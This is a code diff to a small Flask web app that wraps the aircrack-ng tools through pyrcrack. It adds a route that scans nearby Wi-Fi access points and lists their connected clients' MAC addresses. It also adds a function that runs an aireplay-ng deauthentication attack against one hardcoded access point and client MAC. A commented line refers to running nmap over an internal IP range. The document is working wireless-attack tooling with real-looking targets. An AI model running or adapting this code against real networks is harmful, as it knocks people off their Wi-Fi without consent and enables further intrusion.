@@ -8,6 +8,9 @@ from async_timeout import timeout
 from contextlib import suppress
 
 app = Flask(__name__)
+loop = asyncio.get_event_loop()
+asyncio.get_child_watcher().attach_loop(loop)
+
 
 @app.route("/")
 def index():
@@ -40,31 +43,41 @@ async def attack(interface, apo):
                 interface['interface'], deauth=sys.argv[1], D=True)
             print(await aireplay.proc.communicate())
 
-async def getAps():
+async def attack1(interface):
+    """Run aireplay deauth attack."""
+    async with pyrcrack.AirmonNg() as airmon:
+        await airmon.set_monitor(interface['interface'], "1")
+        async with pyrcrack.AireplayNg() as aireplay:
+            await aireplay.run(
+                    interface['interface'], deauth="5", D=True, a="B4:FB:E4:20:97:E8", c="7C:04:D0:62:77:EE" )
+            print(await aireplay.proc.communicate())
+
+@app.route("/aps")
+def getAps():
+    result = loop.run_until_complete(getApsHelper())
+    return result
+
+async def getApsHelper():
     """Scan for targets, return json."""
+    apsList= []
     async with pyrcrack.AirmonNg() as airmon:
         interface = (await airmon.list_wifis())[0]['interface']
         interface = (await airmon.set_monitor(interface))[0]
         async with pyrcrack.AirodumpNg() as pdump:
             await pdump.run(interface['interface'], write_interval=1)
-            await asyncio.sleep(20)
+            await asyncio.sleep(15)
             aps = pdump.sorted_aps()
-            apsList = []
             for ap in aps:
                 currentDict = {"bssid": ap.bssid, "essid": ap.essid,"channel": ap.channel, "clients": [c.station_mac for c in ap.clients]}
                 apsList.append(currentDict)
-        #       await attack(interface, apo)
+           # await attack1(interface)
             print(json.dumps(apsList))
-            return json.dumps(apsList)
+    return json.dumps(apsList)
 
 
-async def printing():
-    async with pyrcrack.AirmonZc() as airmon:
-        print(await airmon.list_wifis())
-
-#if __name__ == "__main__":
-#    app.run(debug=True)
+if __name__ == "__main__":
+    app.run()
 
 # runNmap('10.202.208.1-30')
-asyncio.run(getAps())
+#asyncio.run(getApsHelper())
 # asyncio.run(printing())
